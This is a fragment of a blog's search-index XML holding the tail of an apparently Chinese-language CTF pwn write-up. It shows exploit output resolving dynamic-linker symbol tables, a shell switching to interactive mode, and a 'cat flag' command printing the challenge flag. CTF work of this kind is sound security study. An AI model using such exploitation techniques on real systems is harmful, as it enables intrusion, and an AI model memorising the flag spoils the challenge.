class="line">[*] Found DT_STRTAB at 0xf77afde0</span><br><span class="line">[*] Found DT_SYMTAB at 0xf77afde8</span><br><span class="line">[*] .gnu.hash parms</span><br><span class="line">[*] <span class="built_in">hash</span> chain index</span><br><span class="line">[*] <span class="built_in">hash</span> chain</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">CTF&#123;882130cf51d65fb705440b218e94e98e&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
